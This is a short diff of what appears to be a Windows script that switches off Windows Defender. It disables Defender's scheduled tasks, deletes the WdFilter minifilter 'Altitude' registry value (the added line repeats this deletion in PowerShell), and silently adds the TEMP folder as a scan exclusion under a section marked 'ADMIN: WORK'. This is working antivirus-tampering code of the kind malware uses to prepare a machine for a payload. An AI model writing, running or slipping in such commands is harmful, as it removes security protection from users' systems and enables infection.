@@ -30,6 +30,7 @@ schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Schedu
 schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
 gpupdate /force
 reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" /v Altitude /f
+Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WdFilter\Instances\WdFilter Instance" -Name "Altitude" -Force
 # ===== ADMIN: WORK =====
 $folder = $env:TEMP
 try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
